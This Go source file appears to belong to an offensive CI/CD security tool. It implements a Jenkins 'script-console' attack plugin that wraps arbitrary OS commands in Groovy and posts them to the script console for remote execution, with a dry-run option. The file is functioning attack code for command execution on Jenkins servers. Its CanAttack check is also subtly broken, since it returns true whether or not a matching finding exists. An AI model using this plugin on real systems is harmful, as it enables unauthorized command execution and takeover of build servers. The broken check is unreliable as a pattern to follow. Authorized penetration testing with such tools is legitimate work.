package scriptconsole

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/detections"
	"github.com/praetorian-inc/trajan/pkg/jenkins"
)

func init() {
	registry.RegisterAttackPlugin("jenkins", "script-console", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements arbitrary Groovy/OS command execution via script console.
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new script-console attack plugin.
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"script-console",
			"Execute arbitrary Groovy/OS commands via Jenkins script console",
			"jenkins",
			attacks.CategoryCICD,
		),
	}
}

// CanAttack checks if script console execution is applicable.
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	for i := range findings {
		f := &findings[i]
		if f.Platform == "jenkins" && f.Workflow == "/script" {
			return true
		}
	}
	return true
}

// Execute performs the script console attack.
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	jPlatform, ok := opts.Platform.(*jenkins.Platform)
	if !ok {
		return nil, fmt.Errorf("platform is not Jenkins")
	}
	client := jPlatform.Client()

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
	}

	// Determine the Groovy script to execute
	script := opts.Payload
	if script == "" {
		command, ok := opts.ExtraOpts["command"]
		if !ok || command == "" {
			return nil, fmt.Errorf("must provide --payload (Groovy script) or --command (OS command)")
		}
		// Wrap OS command in Groovy execution
		escaped := strings.ReplaceAll(command, "\\", "\\\\")
		escaped = strings.ReplaceAll(escaped, "'", "\\'")
		script = fmt.Sprintf("def proc = '%s'.execute(); proc.waitFor(); println proc.text", escaped)
	}

	if opts.DryRun {
		result.Success = true
		result.Message = "DRY RUN: Would execute script via /scriptText"
		result.Data = map[string]interface{}{
			"script": script,
			"note":   "Use --confirm to execute",
		}
		return result, nil
	}

	output, err := client.PostScript(ctx, script)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("Script execution failed: %v", err)
		return result, nil
	}

	result.Success = true
	result.Message = "Script executed successfully"
	result.Data = map[string]interface{}{
		"output": output,
	}
	return result, nil
}

// Cleanup is a no-op for script console (stateless operation).
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	return nil
}
